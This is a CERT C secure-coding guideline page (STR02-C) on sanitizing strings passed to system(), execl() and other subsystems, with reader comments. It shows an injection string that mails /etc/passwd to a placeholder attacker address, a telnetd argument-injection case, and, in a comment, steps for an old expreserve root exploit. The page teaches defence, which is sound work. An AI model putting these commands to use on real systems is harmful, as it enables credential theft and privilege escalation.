String data passed to complex subsystems may contain special characters that can trigger commands or actions, resulting in a software [vulnerability](BB.-Definitions_87152273.html#BB.Definitions-vulnerability). As a result, it is necessary to [sanitize](BB.-Definitions_87152273.html#BB.Definitions-sanitize) all string data passed to complex subsystems so that the resulting string is innocuous in the context in which it will be interpreted.
These are some examples of complex subsystems:
-   Command processor via a call to `system()` or similar function (also addressed in [ENV03-C. Sanitize the environment when invoking external programs](ENV03-C_%20Sanitize%20the%20environment%20when%20invoking%20external%20programs))
-   External programs
-   Relational databases
-   Third-party commercial off-the-shelf components (for example, an enterprise resource planning subsystem)
## Noncompliant Code Example
Data sanitization requires an understanding of the data being passed and the capabilities of the subsystem. John Viega and Matt Messier provide an example of an application that inputs an email address to a buffer and then uses this string as an argument in a call to `system()` \[[Viega 2003](AA.-Bibliography_87152170.html#AA.Bibliography-Viega03)\]:
``` c
sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
system(buffer);
```
The risk, of course, is that the user enters the following string as an email address:
``` java
bogus@addr.com; cat /etc/passwd  | mail some@badguy.net
```
For more information on the `system()` call, see [ENV03-C. Sanitize the environment when invoking external programs](ENV03-C_%20Sanitize%20the%20environment%20when%20invoking%20external%20programs) and [ENV33-C. Do not call system()](ENV33-C_%20Do%20not%20call%20system__).
## Compliant Solution
It is necessary to ensure that all valid data is accepted, while potentially dangerous data is rejected or [sanitized](BB.-Definitions_87152273.html#BB.Definitions-sanitize). Doing so can be difficult when valid characters or sequences of characters also have special meaning to the subsystem and may involve [validating](BB.-Definitions_87152273.html#BB.Definitions-validation) the data against a grammar. In cases where there is no overlap, whitelisting can be used to eliminate dangerous characters from the data.
The whitelisting approach to data sanitization is to define a list of acceptable characters and remove any character that is not acceptable. The list of valid input values is typically a predictable, well-defined set of manageable size. This compliant solution, based on the `tcp_wrappers` package written by Wietse Venema, shows the whitelisting approach:
``` c
static char ok_chars[] = "abcdefghijklmnopqrstuvwxyz"
                         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                         "1234567890_-.@";
char user_data[] = "Bad char 1:} Bad char 2:{";
char *cp = user_data; /* Cursor into string */
const char *end = user_data + strlen( user_data);
for (cp += strspn(cp, ok_chars); cp != end; cp += strspn(cp, ok_chars)) {
  *cp = '_';
}
```
The benefit of whitelisting is that a programmer can be certain that a string contains only characters that are considered safe by the programmer. Whitelisting is recommended over blacklisting, which traps all unacceptable characters, because the programmer needs only to ensure that acceptable characters are identified. As a result, the programmer can be less concerned about which characters an attacker may try in an attempt to bypass security checks.
## Noncompliant Code Example
This noncompliant code example is taken from \[[VU#881872](AA.-Bibliography_87152170.html#AA.Bibliography-VU881872)\], a vulnerability in the Sun Solaris TELNET daemon (`in.telnetd`) that allows a remote attacker to log on to the system with elevated privileges.
The vulnerability in `in.telnetd` invokes the `login` program by calling `execl()`. This call passes unsanitized data from an untrusted source (the `USER` environment variable) as an argument to the `login` program:
``` c
(void) execl(LOGIN_PROGRAM, "login",
  "-p",
  "-d", slavename,
  "-h", host,
  "-s", pam_svc_name,
  (AuthenticatingUser != NULL ? AuthenticatingUser :
  getenv("USER")),
  0);
```
An attacker, in this case, can gain unauthenticated access to a system by setting the `USER` environment variable to a string, which is interpreted as an additional command-line option by the `login` program. This kind of attack is called *argument injection*.
## Compliant Solution
This compliant solution inserts the `"--"` (double dash) argument before the call to `getenv("USER")` in the call to `execl()`:
``` c
(void) execl(LOGIN_PROGRAM, "login",
  "-p",
  "-d", slavename,
  "-h", host,
  "-s", pam_svc_name,
  "--",
  (AuthenticatingUser != NULL ? AuthenticatingUser :
  getenv("USER")), 0);
```
Because the `login` program uses the POSIX `getopt()` function to parse command-line arguments, and because the `"--"` option causes `getopt()` to stop interpreting options in the argument list, the `USER` variable cannot be used by an attacker to inject an additional command-line option. This is a valid means of sanitizing the untrusted user data in this context because the behavior of the interpretation of the resulting string is rendered innocuous.
The call to `execl()` is not susceptible to command injection because the shell command interpreter is not invoked. (See [ENV33-C. Do not call system()](ENV33-C_%20Do%20not%20call%20system__).)
## Risk Assessment
Failure to [sanitize](BB.-Definitions_87152273.html#BB.Definitions-sanitize) data passed to a complex subsystem can lead to an injection attack, data integrity issues, and a loss of sensitive data.

| Recommendation | Severity | Likelihood | Remediation Cost | Priority | Level |
| ----|----|----|----|----|----|
| STR02-C | High | Likely | Medium | P18 | L1 |

### Automated Detection

| Tool | Version | Checker | Description |
| ----|----|----|----|
| Astrée | 24.04 |  | Supported by stubbing/taint analysis |
| CodeSonar | 8.3p0 | IO.INJ.COMMANDIO.INJ.FMT
IO.INJ.LDAP
IO.INJ.LIB
IO.INJ.SQL
IO.UT.LIB
IO.UT.PROC
 | Command injectionFormat string injection
LDAP injection
Library injection
SQL injection
Untrusted Library Load
Untrusted Process Creation |
| Coverity | 6.5 | TAINTED_STRING | Fully implemented |
| Klocwork | 2024.4 | NNTS.TAINTEDSV.TAINTED.INJECTION |  |
| LDRA tool suite | 9.7.1 | 108 D, 109 D | Partially implemented |
| Parasoft C/C++test | 2024.2 | CERT_C-STR02-aCERT_C-STR02-b
CERT_C-STR02-c | Protect against command injectionProtect against file name injection
Protect against SQL injection |
| Polyspace Bug Finder | R2024a | CERT C: Rec. STR02-C | Checks for:Execution of externally controlled commandCommand executed from externally controlled pathLibrary loaded from externally controlled pathRec. partially covered. |

### Related Vulnerabilities
Search for [vulnerabilities](BB.-Definitions_87152273.html#BB.Definitions-vulnerability) resulting from the violation of this rule on the [CERT website](https://www.kb.cert.org/vulnotes/bymetric?searchview&query=FIELD+KEYWORDS+contains+STR02-C).
## Related Guidelines

|  |  |
| ----|----|
| SEI CERT C++ Coding Standard | VOID STR02-CPP. Sanitize data passed to complex subsystems |
| CERT Oracle Secure Coding Standard for Java | IDS00-J. Prevent SQL injection |
| MITRE CWE | CWE-88, Argument injection or modificationCWE-78, Failure to sanitize data into an OS command (aka "OS command injection") |

## Bibliography

|  |
| ----|
| [Viega 2003] |

------------------------------------------------------------------------
[](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152414) [](../c/Rec_%2007_%20Characters%20and%20Strings%20_STR_) [](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152399)
## Comments:

|  |
| ----|
| 
Historical Context
    sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
    system(buffer);

The history of this bug is as follows. The `expreserve` command was set-uid root. When the editor crashed it would save the vi editor buffer and send mail to the user that their session was saved.
To abuse this:
-   create an executable shell script called "bin" in the current directory
-   execute `"PATH=.:$PATH IFS=/ vi"`
-   type some text
-   type `":preserve"`
The commands in the `bin` directory are executed with root privileges. This worked fine on my System V Release 2 box in 1987. See also the text around "preserve" in <http://securitydigest.org/unix/archive/032>
--Wietse Venema
![](images/icons/contenttypes/comment_16.png) Posted by svoboda at Apr 16, 2008 10:20
\| \|
This brings up the point that safe shell scripts need to set IFS and PATH.  
![](images/icons/contenttypes/comment_16.png) Posted by dagwyn at Apr 16, 2008 21:09
\| \|
This rule in its most general form is unenforceable, because there is no rigorous definition of a 'complex subsystem'...both `system()` and `execle()` are used as examples.
We could try to catch violations on individual cases, like the `system()` call in the first NCCE. These violations are caught by dynamic analysis much more easily.
How do Fortify and Klocwork enforce this rule???
![](images/icons/contenttypes/comment_16.png) Posted by svoboda at Jul 23, 2008 15:41
\| \|
I presume this is the best rule to handle usage of `_mbs` functions, but I suspect we could use a more specific rule: <https://www.fortify.com/vulncat/en/vulncat/cpp/often_misused_strings__mbs.html>
![](images/icons/contenttypes/comment_16.png) Posted by svoboda at Dec 10, 2010 14:07
\| \|
The `_mbsxxx` Multibyte/wide string conversion functions referenced on the Fortify page are Windows-specific and the problems mentioned there are simply bugs. I'd like to see rules that are generally applicable and independent of implementation details (unless the details are sufficiently common across implementations). Other than that, if we had a section of localization practices I think it would be the best home for rules on the appropriate use of these function.
![](images/icons/contenttypes/comment_16.png) Posted by martinsebor at Dec 11, 2010 17:57
\| \|
It seems that there is an error in the provided example. The first letter of "user_data" is always replaced by "\_". I would recommend something like:
``` java
static char ok_chars[] = "abcdefghijklmnopqrstuvwxyz"
                         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                         "1234567890_-.@";
char user_data[] = "Bad char 1:} Bad char 2:{";
char *cp; /* cursor into string */
const char *end = user_data + strlen( user_data);
cp = user_data;
for (cp += strspn(cp, ok_chars); cp != end; cp += strspn(cp, ok_chars)) {
  *cp = '_';
}
```
![](images/icons/contenttypes/comment_16.png) Posted by vbufferne at Apr 22, 2011 13:02
\| \|
Fixed, thanks.
![](images/icons/contenttypes/comment_16.png) Posted by svoboda at Apr 22, 2011 13:26
\| \|
I think that you have forgotten the "cp = user_data;" line.
For information, there is the same issue with STR02-CPP example.
![](images/icons/contenttypes/comment_16.png) Posted by vbufferne at May 02, 2011 11:33
\| \|
Fixed (both here are in STR02-CPP)
![](images/icons/contenttypes/comment_16.png) Posted by svoboda at May 02, 2011 13:04
\|
